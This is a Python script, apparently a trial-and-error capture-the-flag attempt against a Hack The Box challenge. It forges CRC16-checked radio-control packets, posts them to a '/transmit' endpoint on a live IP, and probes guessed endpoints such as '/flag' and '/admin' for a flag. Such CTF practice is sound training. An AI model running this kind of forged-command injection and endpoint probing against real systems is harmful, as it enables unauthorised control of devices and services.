#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 17: Monitorear updates continuamente mientras enviamos
print("[*] INNOVACIÓN 17: Monitoreo continuo durante envío")
s = requests.Session()
s.get(base_url)

# Enviar comandos y monitorear
for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    
    # Verificar inmediatamente
    r = s.get(f'{base_url}/updates')
    if 'HTB{' in r.text or 'success' in r.text.lower() or 'escape' in r.text.lower():
        print(f"[+] Cambio después de enviar a {addr:02X}")
        print(r.text)
    
    time.sleep(0.5)

# INNOVACIÓN 18: Verificar TODOS los endpoints después de enviar
print("\n[*] INNOVACIÓN 18: Verificar múltiples endpoints")
endpoints = ['/', '/updates', '/status', '/flag', '/escape', '/success', '/admin', '/mission', '/agent']

for endpoint in endpoints:
    try:
        r = s.get(f'{base_url}{endpoint}')
        if r.status_code == 200:
            flags = re.findall(r'HTB\{[^}]+\}', r.text)
            if flags:
                print(f"[SUCCESS in {endpoint}]", flags)
                break
            if len(r.text) > 100 and len(r.text) < 10000:
                if 'escape' in r.text.lower() or 'success' in r.text.lower():
                    print(f"[+] {endpoint}: {r.text[:200]}")
    except:
        pass

# INNOVACIÓN 19: Esperar más tiempo después de enviar
print("\n[*] INNOVACIÓN 19: Enviar y esperar 10 segundos")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

print("[*] Esperando 10 segundos...")
for i in range(10):
    time.sleep(1)
    r = s.get(f'{base_url}/updates')
    print(f"  [{i+1}s] {r.text[:100]}...")
    if 'HTB{' in r.text:
        print(f"[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

# INNOVACIÓN 20: Hacer petición POST a /updates
print("\n[*] INNOVACIÓN 20: POST a /updates")
r = s.post(f'{base_url}/updates')
if 'HTB{' in r.text:
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print(r.text[:200])
